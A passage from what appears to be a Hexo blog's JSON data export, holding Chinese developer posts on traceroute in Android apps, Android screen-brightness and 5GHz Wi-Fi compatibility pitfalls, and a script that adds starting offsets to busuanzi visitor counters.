href=\"https://juejin.cn/post/6927974019421601806\">自从学会原始套接字之后，我感觉掌握了整个世界</a>，原始套接字必须有ROOT权限才能使用：</p>\n<blockquote>\n<p>因为网络级IP数据包没有”端口“的概念，所以可以读取网络设备传入的所有数据包，这意味着什么？意味着安全性，使用了原始套接字的应用程序可以读取所有进入系统的网络数据包，也就是我们可以捕获其他应用程序的数据包，所以为了防止这种情况的发生，Linux要求所有访问原始套接字的程序都必须以root身份运行。</p>\n</blockquote>\n<p>我们把traceroute编译到Android的App中，运行环境就在应用层，默认是没有ROOT权限的，所以“-T”参数自然也就用不了。</p>\n<h4 id=\"低版本Android系统连“-I”也用不了\"><a href=\"#低版本Android系统连“-I”也用不了\" class=\"headerlink\" title=\"低版本Android系统连“-I”也用不了\"></a>低版本Android系统连“-I”也用不了</h4><p>经过一些兼容性测试（覆盖了6.0及以上的所有大版本），我发现在Android 9.0及以下的系统中即便是“-I”参数也会执行失败，错误信息包含“socket bind”之类的，也就是说不同Android版本的socket函数库可能实现不同，才导致了低版本连ICMP发包都不行。</p>\n<p>解决办法有两种：</p>\n<ol>\n<li>判断Android系统版本，在9.0及以下使用默认无参的traceroute，降级到UDP发包；10.0及以后使用“-I”参数。</li>\n<li>通过ping命令工具来模拟traceroute，因为ping工具是Android系统默认就预装了的，可以直接在Java层通过调用命令的方式执行，其次ping本身也有参数项来设置TTL值，且默认就用ICMP发包。为此我也做了一个简单的实现，可参考：<a href=\"https://github.com/ysy950803/traceroute-for-android/blob/master/library/src/main/java/com/wandroid/traceroute/TraceRouteByPing.java\">TraceRouteByPing</a></li>\n</ol>\n"},{"title":"Android系统兼容适配踩坑（持续更新）","date":"2023-07-21T08:32:31.000Z","_content":"\n## 屏幕亮度范围\n\n在Android应用层，要获取屏幕亮度，一般是通过读取系统Settings表中的配置：\n\n```java\nSettings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS);\n```\n\n从AOSP[源码](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/provider/Settings.java;l=4550?q=SCREEN_BRIGHTNESS)可以看出，其范围是0到255，如果要修改亮度，也是通过这个key去**putInt**的：\n\n```java\n/**\n* The screen backlight brightness between 0 and 255.\n*/\npublic static final String SCREEN_BRIGHTNESS = \"screen_brightness\";\n```\n\n原则上无论什么设备，厂商都应该按照这个亮度范围去做类似“归一化”的适配，才能让上层开发者写出可靠的代码。\n\n**实际上，这个范围值并不可靠，很多厂商根本没在意这个源码注释中的255上限。**这就导致了开发者以为修改成255就是最大亮度，但效果不符合预期。\n\n我们可以通过获取最大亮度的配置值来验证：\n\n```java\nint id = getResources().getIdentifier(\"config_screenBrightnessSettingMaximum\", \"integer\", \"android\");\nint maxBrightness = getResources().getInteger(id);\n```\n\n亲测某Android 11设备获取到的值是2047，而某Android 13设备又是16000多，只有某Android 7设备老老实实返回了255。\n\n### 解决\n\n说明屏幕厂商和ROM厂商着实坑了一把开发者，源码变得不可信。如果我们要兼容各Android版本，做一个调解屏幕亮度的SeekBar，只能先获取实际的最大亮度，而不是默认它为255。\n\n## WiFi芯片支持频率\n\n要判断设备WiFi芯片是否支持5GHz频率，一般是调用WifiManager的**is5GHzBandSupported**方法，源码如下：\n\n```java\n/**\n* Check if the chipset supports 5GHz band.\n* @return {@code true} if supported, {@code false} otherwise.\n*/\npublic boolean is5GHzBandSupported() {\n  try {\n    return mService.is5GHzBandSupported();\n  } catch (RemoteException e) {\n    throw e.rethrowFromSystemServer();\n  }\n}\n```\n\n这是Android SDK的公开接口，从API 21就有了，理论上应该比较靠谱。开发者的预期就是无论何时调用这个方法，返回值都是一样的，因为硬件配置从设备出厂后一般是不会改变的。\n\n**实际上，这个方法也不完全可信。**经测试，在某Android 7设备上，如果保持WLAN开关开启，可以正常获取到true（支持双频）或false（仅支持2.4GHz），但一旦关闭开关，就只会返回false了，这不符合预期，芯片本身的属性不应该受是否开启影响。\n\n目前暂时没有做大范围测试，不知道是不是只有Android低版本系统有此问题，而在Android 13等较新版本的系统上，不会有这个问题，即便关闭WLAN，也能获取到正确值。\n\n从这个帖子[WifiManager.is5GHzBandSupported() lying?](https://stackoverflow.com/questions/31287989/wifimanager-is5ghzbandsupported-lying)也能看出，厂商对这个方法的适配支持的确不靠谱。\n\n### 解决\n\n如果我们要兼容各Android版本，就只能自行缓存正确值，也就是当返回true时，就记录到本地，以后直接获取缓存值即可；返回false时，就认为值不可靠，不进行缓存。示例如下：\n\n```java\npublic boolean isWifi5GSupported() {\n  boolean cache = SPUtil.getBoolean(\"config_wifi5ghzSupport\");\n  if (cache) return true;\n  boolean support = mWifiManager != null && mWifiManager.is5GHzBandSupported();\n  SPUtil.put(\"config_wifi5ghzSupport\", support);\n  return support;\n}\n```\n\n这样可以保证应用一旦获取到正确值，后续就可以不再依赖系统接口了。\n\n## 未完待续\n\n以后有什么坑会继续记录……\n","source":"_posts/2023-07-21-Android系统兼容适配踩坑（持续更新）.md","raw":"---\ntitle: Android系统兼容适配踩坑（持续更新）\ndate: 2023-07-21 16:32:31\ntags:\n  - Android\n  - AOSP\n---\n\n## 屏幕亮度范围\n\n在Android应用层，要获取屏幕亮度，一般是通过读取系统Settings表中的配置：\n\n```java\nSettings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS);\n```\n\n从AOSP[源码](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/provider/Settings.java;l=4550?q=SCREEN_BRIGHTNESS)可以看出，其范围是0到255，如果要修改亮度，也是通过这个key去**putInt**的：\n\n```java\n/**\n* The screen backlight brightness between 0 and 255.\n*/\npublic static final String SCREEN_BRIGHTNESS = \"screen_brightness\";\n```\n\n原则上无论什么设备，厂商都应该按照这个亮度范围去做类似“归一化”的适配，才能让上层开发者写出可靠的代码。\n\n**实际上，这个范围值并不可靠，很多厂商根本没在意这个源码注释中的255上限。**这就导致了开发者以为修改成255就是最大亮度，但效果不符合预期。\n\n我们可以通过获取最大亮度的配置值来验证：\n\n```java\nint id = getResources().getIdentifier(\"config_screenBrightnessSettingMaximum\", \"integer\", \"android\");\nint maxBrightness = getResources().getInteger(id);\n```\n\n亲测某Android 11设备获取到的值是2047，而某Android 13设备又是16000多，只有某Android 7设备老老实实返回了255。\n\n### 解决\n\n说明屏幕厂商和ROM厂商着实坑了一把开发者，源码变得不可信。如果我们要兼容各Android版本，做一个调解屏幕亮度的SeekBar，只能先获取实际的最大亮度，而不是默认它为255。\n\n## WiFi芯片支持频率\n\n要判断设备WiFi芯片是否支持5GHz频率，一般是调用WifiManager的**is5GHzBandSupported**方法，源码如下：\n\n```java\n/**\n* Check if the chipset supports 5GHz band.\n* @return {@code true} if supported, {@code false} otherwise.\n*/\npublic boolean is5GHzBandSupported() {\n  try {\n    return mService.is5GHzBandSupported();\n  } catch (RemoteException e) {\n    throw e.rethrowFromSystemServer();\n  }\n}\n```\n\n这是Android SDK的公开接口，从API 21就有了，理论上应该比较靠谱。开发者的预期就是无论何时调用这个方法，返回值都是一样的，因为硬件配置从设备出厂后一般是不会改变的。\n\n**实际上，这个方法也不完全可信。**经测试，在某Android 7设备上，如果保持WLAN开关开启，可以正常获取到true（支持双频）或false（仅支持2.4GHz），但一旦关闭开关，就只会返回false了，这不符合预期，芯片本身的属性不应该受是否开启影响。\n\n目前暂时没有做大范围测试，不知道是不是只有Android低版本系统有此问题，而在Android 13等较新版本的系统上，不会有这个问题，即便关闭WLAN，也能获取到正确值。\n\n从这个帖子[WifiManager.is5GHzBandSupported() lying?](https://stackoverflow.com/questions/31287989/wifimanager-is5ghzbandsupported-lying)也能看出，厂商对这个方法的适配支持的确不靠谱。\n\n### 解决\n\n如果我们要兼容各Android版本，就只能自行缓存正确值，也就是当返回true时，就记录到本地，以后直接获取缓存值即可；返回false时，就认为值不可靠，不进行缓存。示例如下：\n\n```java\npublic boolean isWifi5GSupported() {\n  boolean cache = SPUtil.getBoolean(\"config_wifi5ghzSupport\");\n  if (cache) return true;\n  boolean support = mWifiManager != null && mWifiManager.is5GHzBandSupported();\n  SPUtil.put(\"config_wifi5ghzSupport\", support);\n  return support;\n}\n```\n\n这样可以保证应用一旦获取到正确值，后续就可以不再依赖系统接口了。\n\n## 未完待续\n\n以后有什么坑会继续记录……\n","slug":"Android系统兼容适配踩坑（持续更新）","published":1,"updated":"2024-03-25T07:31:26.043Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1p005dthe62db35j8s","content":"<h2 id=\"屏幕亮度范围\"><a href=\"#屏幕亮度范围\" class=\"headerlink\" title=\"屏幕亮度范围\"></a>屏幕亮度范围</h2><p>在Android应用层，要获取屏幕亮度，一般是通过读取系统Settings表中的配置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS);</span><br></pre></td></tr></table></figure>\n\n<p>从AOSP<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/provider/Settings.java;l=4550?q=SCREEN_BRIGHTNESS\">源码</a>可以看出，其范围是0到255，如果要修改亮度，也是通过这个key去<strong>putInt</strong>的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* The screen backlight brightness between 0 and 255.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">SCREEN_BRIGHTNESS</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;screen_brightness&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>原则上无论什么设备，厂商都应该按照这个亮度范围去做类似“归一化”的适配，才能让上层开发者写出可靠的代码。</p>\n<p><strong>实际上，这个范围值并不可靠，很多厂商根本没在意这个源码注释中的255上限。</strong>这就导致了开发者以为修改成255就是最大亮度，但效果不符合预期。</p>\n<p>我们可以通过获取最大亮度的配置值来验证：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> getResources().getIdentifier(<span class=\"string\">&quot;config_screenBrightnessSettingMaximum&quot;</span>, <span class=\"string\">&quot;integer&quot;</span>, <span class=\"string\">&quot;android&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">maxBrightness</span> <span class=\"operator\">=</span> getResources().getInteger(id);</span><br></pre></td></tr></table></figure>\n\n<p>亲测某Android 11设备获取到的值是2047，而某Android 13设备又是16000多，只有某Android 7设备老老实实返回了255。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>说明屏幕厂商和ROM厂商着实坑了一把开发者，源码变得不可信。如果我们要兼容各Android版本，做一个调解屏幕亮度的SeekBar，只能先获取实际的最大亮度，而不是默认它为255。</p>\n<h2 id=\"WiFi芯片支持频率\"><a href=\"#WiFi芯片支持频率\" class=\"headerlink\" title=\"WiFi芯片支持频率\"></a>WiFi芯片支持频率</h2><p>要判断设备WiFi芯片是否支持5GHz频率，一般是调用WifiManager的<strong>is5GHzBandSupported</strong>方法，源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* Check if the chipset supports 5GHz band.</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@return</span> &#123;<span class=\"doctag\">@code</span> true&#125; if supported, &#123;<span class=\"doctag\">@code</span> false&#125; otherwise.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">is5GHzBandSupported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> mService.is5GHzBandSupported();</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (RemoteException e) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> e.rethrowFromSystemServer();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是Android SDK的公开接口，从API 21就有了，理论上应该比较靠谱。开发者的预期就是无论何时调用这个方法，返回值都是一样的，因为硬件配置从设备出厂后一般是不会改变的。</p>\n<p><strong>实际上，这个方法也不完全可信。</strong>经测试，在某Android 7设备上，如果保持WLAN开关开启，可以正常获取到true（支持双频）或false（仅支持2.4GHz），但一旦关闭开关，就只会返回false了，这不符合预期，芯片本身的属性不应该受是否开启影响。</p>\n<p>目前暂时没有做大范围测试，不知道是不是只有Android低版本系统有此问题，而在Android 13等较新版本的系统上，不会有这个问题，即便关闭WLAN，也能获取到正确值。</p>\n<p>从这个帖子<a href=\"https://stackoverflow.com/questions/31287989/wifimanager-is5ghzbandsupported-lying\">WifiManager.is5GHzBandSupported() lying?</a>也能看出，厂商对这个方法的适配支持的确不靠谱。</p>\n<h3 id=\"解决-1\"><a href=\"#解决-1\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>如果我们要兼容各Android版本，就只能自行缓存正确值，也就是当返回true时，就记录到本地，以后直接获取缓存值即可；返回false时，就认为值不可靠，不进行缓存。示例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isWifi5GSupported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">cache</span> <span class=\"operator\">=</span> SPUtil.getBoolean(<span class=\"string\">&quot;config_wifi5ghzSupport&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (cache) <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">support</span> <span class=\"operator\">=</span> mWifiManager != <span class=\"literal\">null</span> &amp;&amp; mWifiManager.is5GHzBandSupported();</span><br><span class=\"line\">  SPUtil.put(<span class=\"string\">&quot;config_wifi5ghzSupport&quot;</span>, support);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> support;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样可以保证应用一旦获取到正确值，后续就可以不再依赖系统接口了。</p>\n<h2 id=\"未完待续\"><a href=\"#未完待续\" class=\"headerlink\" title=\"未完待续\"></a>未完待续</h2><p>以后有什么坑会继续记录……</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"屏幕亮度范围\"><a href=\"#屏幕亮度范围\" class=\"headerlink\" title=\"屏幕亮度范围\"></a>屏幕亮度范围</h2><p>在Android应用层，要获取屏幕亮度，一般是通过读取系统Settings表中的配置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS);</span><br></pre></td></tr></table></figure>\n\n<p>从AOSP<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/provider/Settings.java;l=4550?q=SCREEN_BRIGHTNESS\">源码</a>可以看出，其范围是0到255，如果要修改亮度，也是通过这个key去<strong>putInt</strong>的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* The screen backlight brightness between 0 and 255.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">SCREEN_BRIGHTNESS</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;screen_brightness&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>原则上无论什么设备，厂商都应该按照这个亮度范围去做类似“归一化”的适配，才能让上层开发者写出可靠的代码。</p>\n<p><strong>实际上，这个范围值并不可靠，很多厂商根本没在意这个源码注释中的255上限。</strong>这就导致了开发者以为修改成255就是最大亮度，但效果不符合预期。</p>\n<p>我们可以通过获取最大亮度的配置值来验证：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> getResources().getIdentifier(<span class=\"string\">&quot;config_screenBrightnessSettingMaximum&quot;</span>, <span class=\"string\">&quot;integer&quot;</span>, <span class=\"string\">&quot;android&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">maxBrightness</span> <span class=\"operator\">=</span> getResources().getInteger(id);</span><br></pre></td></tr></table></figure>\n\n<p>亲测某Android 11设备获取到的值是2047，而某Android 13设备又是16000多，只有某Android 7设备老老实实返回了255。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>说明屏幕厂商和ROM厂商着实坑了一把开发者，源码变得不可信。如果我们要兼容各Android版本，做一个调解屏幕亮度的SeekBar，只能先获取实际的最大亮度，而不是默认它为255。</p>\n<h2 id=\"WiFi芯片支持频率\"><a href=\"#WiFi芯片支持频率\" class=\"headerlink\" title=\"WiFi芯片支持频率\"></a>WiFi芯片支持频率</h2><p>要判断设备WiFi芯片是否支持5GHz频率，一般是调用WifiManager的<strong>is5GHzBandSupported</strong>方法，源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* Check if the chipset supports 5GHz band.</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@return</span> &#123;<span class=\"doctag\">@code</span> true&#125; if supported, &#123;<span class=\"doctag\">@code</span> false&#125; otherwise.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">is5GHzBandSupported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> mService.is5GHzBandSupported();</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (RemoteException e) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> e.rethrowFromSystemServer();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是Android SDK的公开接口，从API 21就有了，理论上应该比较靠谱。开发者的预期就是无论何时调用这个方法，返回值都是一样的，因为硬件配置从设备出厂后一般是不会改变的。</p>\n<p><strong>实际上，这个方法也不完全可信。</strong>经测试，在某Android 7设备上，如果保持WLAN开关开启，可以正常获取到true（支持双频）或false（仅支持2.4GHz），但一旦关闭开关，就只会返回false了，这不符合预期，芯片本身的属性不应该受是否开启影响。</p>\n<p>目前暂时没有做大范围测试，不知道是不是只有Android低版本系统有此问题，而在Android 13等较新版本的系统上，不会有这个问题，即便关闭WLAN，也能获取到正确值。</p>\n<p>从这个帖子<a href=\"https://stackoverflow.com/questions/31287989/wifimanager-is5ghzbandsupported-lying\">WifiManager.is5GHzBandSupported() lying?</a>也能看出，厂商对这个方法的适配支持的确不靠谱。</p>\n<h3 id=\"解决-1\"><a href=\"#解决-1\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>如果我们要兼容各Android版本，就只能自行缓存正确值，也就是当返回true时，就记录到本地，以后直接获取缓存值即可；返回false时，就认为值不可靠，不进行缓存。示例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isWifi5GSupported</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">cache</span> <span class=\"operator\">=</span> SPUtil.getBoolean(<span class=\"string\">&quot;config_wifi5ghzSupport&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (cache) <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">support</span> <span class=\"operator\">=</span> mWifiManager != <span class=\"literal\">null</span> &amp;&amp; mWifiManager.is5GHzBandSupported();</span><br><span class=\"line\">  SPUtil.put(<span class=\"string\">&quot;config_wifi5ghzSupport&quot;</span>, support);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> support;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样可以保证应用一旦获取到正确值，后续就可以不再依赖系统接口了。</p>\n<h2 id=\"未完待续\"><a href=\"#未完待续\" class=\"headerlink\" title=\"未完待续\"></a>未完待续</h2><p>以后有什么坑会继续记录……</p>\n"},{"title":"给不蒜子（busuanzi）统计数据增加初始值","date":"2023-07-31T08:54:00.000Z","_content":"\n### 背景\n\n最近把个人博客迁移到了[Hexo框架](https://hexo.io/)，并使用了[Butterfly主题](https://butterfly.js.org/posts/4aa8abbe/#%E8%A8%AA%E5%95%8F%E4%BA%BA%E6%95%B8-busuanzi-UV-%E5%92%8C-PV)，得益于博客框架的易用性和主题功能的丰富程度，感觉非常的香。我对比了很多Hexo主题，这一个算是在功能、审美、文档等各方面几乎完美符合我需求的。\n\nButterfly很贴心地集成了[不蒜子](http://busuanzi.ibruce.info/)计数工具，可以统计网站的访问数据（人数，次数等）。只需要修改主题config文件即可开启：\n\n```yaml\nbusuanzi:\n  site_uv: true\n  site_pv: true\n  page_pv: true\n```\n\n即便没有使用Hexo框架和Butterfly主题，用不蒜子计数也是很简单的。\n\n这个工具存在快十年了，其首页的标语就是“两行代码，搞定计数”。感觉这位作者也是个有情怀的开发者，维护服务器给大家免费使用这么多年。\n\n```javascript\n<script async src=\"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n            <span id=\"busuanzi_container_site_pv\">本站总访问量<span id=\"busuanzi_value_site_pv\"></span>次</span>\n```\n\n但是，有个小问题，如果你的网站首次集成这个脚本，计数自然是从0开始的，对于很多已经运行很久的网站，不能很客观的展示数据，我们更想要的是能够从一个初始值开始计数。比如我的个人博客在本次大更新之前，就有大约十万访问量了，我希望可以从十万开始统计数据。\n\n不蒜子本身暂时还不支持我这个需求，所以我们只能自己写JS来搞定了。\n\n### 分析\n\n首先我们看一下不蒜子的源码是怎么实现统计和展示数据的，打开上述脚本中的js文件，可以发现代码还是不多的，格式化美化之后才60多行。从源码片段中可以得知，主要数据就3个：\n\n```javascript\n...\n}), bszTag = {\n    bszs: [\"site_pv\", \"page_pv\", \"site_uv\"],\n    texts: function (a) {\n        this.bszs.map(function (b) {\n            var c = document.getElementById(\"busuanzi_value_\" + b);\n            c && (c.innerHTML = a[b])\n        })\n    },\n...\n```\n\n分别是site_pv对应网站访问总次数，page_pv对应每个子页面的访问次数，site_uv对应网站访问的人数，并通过给元素的innerHTML赋值来展示数据。\n\n了解完源码，我们就有大致解决思路了，监听对应元素的加载和变化，在真实数据赋值时，加上自己需要的初始值。\n\n### 解决\n\n直接上JS代码，此处我按个人需求只更改网站的uv和pv，子页面的pv不关注：\n\n```javascript\ndocument.addEventListener(\"DOMContentLoaded\", function () {\n    const uvE = document.getElementById('busuanzi_value_site_uv');\n    const pvE = document.getElementById('busuanzi_value_site_pv');\n    const uvObs = new MutationObserver((mutationsList) => {\n        for (let mutation of mutationsList) {\n            if (mutation.type === 'childList') {\n                uvObs.disconnect();\n                mutation.target.innerHTML = parseInt(mutation.target.innerHTML) + 100000;\n                break;\n            }\n        }\n    });\n    const pvObs = new MutationObserver((mutationsList) => {\n        for (let mutation of mutationsList) {\n            if (mutation.type === 'childList') {\n                pvObs.disconnect();\n                mutation.target.innerHTML = parseInt(mutation.target.innerHTML) + 300000;\n                break;\n            }\n        }\n    });\n    const config = {\n        childList: true\n    };\n    uvObs.observe(uvE, config);\n    pvObs.observe(pvE, config);\n});\n```\n\n首先我们监听DOMContentLoaded事件，在HTML加载完成后，从DOM树中拿到busuanzi_value_site_uv和busuanzi_value_site_pv，再分别监听它们的元素属性变化。比如我这里当uv变化时，就加上一个初始值10万，pv变化时，就加上30万。最终结果就是自定义的这个初始值加上不蒜子的真实统计数据。\n\n把上述代码压缩成一行后加入到script标签中，再添加到HTML的head里面即可：\n\n```html\n...\n<head>\n  <script>document.addEventListener(\"DOMContentLoaded\",function(){const e=document.getElementById(\"busuanzi_value_site_uv\"),t=document.getElementById(\"busuanzi_value_site_pv\"),n=new MutationObserver(e=>{for(let t of e)if(\"childList\"===t.type){n.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+1e5;break}}),i=new MutationObserver(e=>{for(let t of e)if(\"childList\"===t.type){i.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+3e5;break}}),r={childList:!0};n.observe(e,r),i.observe(t,r)});</script>\n</head>\n...\n```\n\n对于使用Butterfly主题的博主来说，可直接修改主题配置文件中的inject，框架会自动插入代码到head中：\n\n```yaml\n# Inject\n# Insert the code to head (before '</head>' tag) and the bottom (before '</body>' tag)\n# 插入代码到头部 </head> 之前 和 底部 </body> 之前\ninject:\n  head:\n  # - <link rel=\"stylesheet\" href=\"/xxx.css\">\n    - <script>...</script>\n```\n\n之所以把JS代码压缩成一行，也是方便这里配置。","source":"_posts/2023-07-31-给不蒜子（busuanzi）统计数据增加初始值.md","raw":"---\ntitle: 给不蒜子（busuanzi）统计数据增加初始值\ndate: 2023-07-31 16:54:00\ntags:\n  - 前端\n  - 鼓捣折腾\n---\n\n### 背景\n\n最近把个人博客迁移到了[Hexo框架](https://hexo.io/)，并使用了[Butterfly主题](https://butterfly.js.org/posts/4aa8abbe/#%E8%A8%AA%E5%95%8F%E4%BA%BA%E6%95%B8-busuanzi-UV-%E5%92%8C-PV)，得益于博客框架的易用性和主题功能的丰富程度，感觉非常的香。我对比了很多Hexo主题，这一个算是在功能、审美、文档等各方面几乎完美符合我需求的。\n\nButterfly很贴心地集成了[不蒜子](http://busuanzi.ibruce.info/)计数工具，可以统计网站的访问数据（人数，次数等）。只需要修改主题config文件即可开启：\n\n```yaml\nbusuanzi:\n  site_uv: true\n  site_pv: true\n  page_pv: true\n```\n\n即便没有使用Hexo框架和Butterfly主题，用不蒜子计数也是很简单的。\n\n这个工具存在快十年了，其首页的标语就是“两行代码，搞定计数”。感觉这位作者也是个有情怀的开发者，维护服务器给大家免费使用这么多年。\n\n```javascript\n<script async src=\"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n            <span id=\"busuanzi_container_site_pv\">本站总访问量<span id=\"busuanzi_value_site_pv\"></span>次</span>\n```\n\n但是，有个小问题，如果你的网站首次集成这个脚本，计数自然是从0开始的，对于很多已经运行很久的网站，不能很客观的展示数据，我们更想要的是能够从一个初始值开始计数。比如我的个人博客在本次大更新之前，就有大约十万访问量了，我希望可以从十万开始统计数据。\n\n不蒜子本身暂时还不支持我这个需求，所以我们只能自己写JS来搞定了。\n\n### 